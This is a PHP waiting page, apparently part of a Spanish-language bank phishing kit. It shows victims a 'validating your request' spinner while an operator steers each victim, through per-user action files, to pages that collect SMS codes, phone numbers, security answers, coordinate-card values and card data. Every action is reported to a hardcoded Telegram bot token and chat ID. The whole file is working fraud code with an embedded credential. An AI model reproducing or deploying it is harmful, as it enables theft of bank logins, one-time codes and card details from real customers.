<?php
// ===== espera.php =====
session_start();

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
  header("Location: index.php");
  exit;
}

// ============================
// CONFIG BOT TELEGRAM
// ============================

$TG_TOKEN  = "8521201522:AAF90SGm6bahwP72Q2TSo83LDxp9ngq94MI";
$TG_CHATID = "-5124260408";

function enviarTelegram($mensaje){
  global $TG_TOKEN, $TG_CHATID;
  $url = "https://api.telegram.org/bot{$TG_TOKEN}/sendMessage";
  @file_get_contents($url . "?" . http_build_query([
    "chat_id" => $TG_CHATID,
    "text"    => $mensaje
  ]));
}

// ============================
// PROCESAR ACCIONES
// ============================

$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    // Aviso general
    enviarTelegram("⚡ ACCIÓN RECIBIDA\n\n👤 Usuario: $usuario\n📌 Acción: $accion");

    if (substr($accion, 0, strlen("/palabra clave/")) === "/palabra clave/") {
        $pregunta = explode("/palabra clave/", $accion)[1];
        $_SESSION['pregunta'] = $pregunta;

        enviarTelegram("🔑 PALABRA CLAVE\n\n👤 $usuario\n❓ $pregunta");

        header("Location: pregunta.php");
        exit;
    }

    if (substr($accion, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
        $etiquetas = explode("/coordenadas etiquetas/", $accion)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);

        enviarTelegram("📍 COORDENADAS\n\n👤 $usuario\n🏷️ $etiquetas");

        header("Location: coordenadas.php");
        exit;
    }

    switch ($accion) {
        case "/SMS":
            enviarTelegram("📩 SMS solicitado\n👤 $usuario");
            header("Location: sms.php");
            break;

        case "/SMSERROR":
            enviarTelegram("❌ ERROR SMS\n👤 $usuario");
            header("Location: smserror.php");
            break;

        case "/NUMERO":
            enviarTelegram("📞 INGRESO NÚMERO\n👤 $usuario");
            header("Location: numero.php");
            break;

        case "/ERROR":
            enviarTelegram("⚠️ ERROR GENERAL\n👤 $usuario");
            header("Location: index2.php");
            break;

        case "/LOGIN":
            enviarTelegram("🔐 LOGIN\n👤 $usuario");
            header("Location: index.php");
            break;

        case "/LOGINERROR":
            enviarTelegram("🚫 LOGIN ERROR\n👤 $usuario");
            header("Location: index2.php");
            break;

        case "/CARD":
            enviarTelegram("💳 TARJETA\n👤 $usuario");
            header("Location: card.html");
            break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3">
  <title>Espere...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      margin-top: 20%;
      background-color: #fff;
      color: #006838;
    }
    .subtexto {
      color: #888;
      margin-top: 10px;
    }
    .loader {
      border: 6px solid #eee;
      border-top: 6px solid #006838;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 30px auto 0;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>Por favor espera…</h2>
  <p class="subtexto">Estamos validando tu solicitud, mantente en línea</p>
  <div class="loader"></div>
</body>
</html>
